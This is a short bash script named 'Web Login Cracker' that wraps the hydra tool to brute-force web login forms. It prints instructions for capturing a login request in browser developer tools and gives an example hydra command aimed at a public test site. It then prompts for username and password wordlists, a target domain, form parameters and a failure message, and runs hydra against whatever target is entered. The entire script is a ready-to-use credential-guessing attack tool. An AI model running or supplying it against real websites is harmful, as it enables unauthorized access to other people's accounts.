#! /bin/bash

figlet -f slant "Web Login Cracker"
echo =======================================================================
echo "1) To use, open firefox and navigate to target website"
echo "2) Type CTRL + SHIFT + I to open developer tools and navigate to network"
echo "3) From there type anything you want into the username and password fields and press submit"
echo "4) Navigate to the new POST request, go to Header, and click Edit & Resend"
echo "5) Then copy the filepath from the URL, request body, and a keyword from the error message after an invalid attempt and format it into a string like below"
echo "To format the failed login message - '/filepath after URL:username=^USER^&password=^PASS^:F=keyword'"
echo "Ex.) hydra -l admin -P Scripts/an0n-net/crackers/hashcat/Hashlists/Edictionary.txt testasp.vulnweb.com http-post-form '/Login.asp?RetURL=%2FDefault.asp%3F:tfUName=^USER^&tfUPass=^PASS^:F=Invalid' -vV -f"
echo =======================================================================
read -p "Enter filepath to username/email wordlist: " uname
read -p "Enter filepath to password wordlist: " pwd
read -p "Enter website domain: " ip
read -p "Enter website form parameters: " form
read -p "Enter copy and paste failed login message here: " fail
hydra -L $uname -P $pwd $ip $form $fail -vV -f
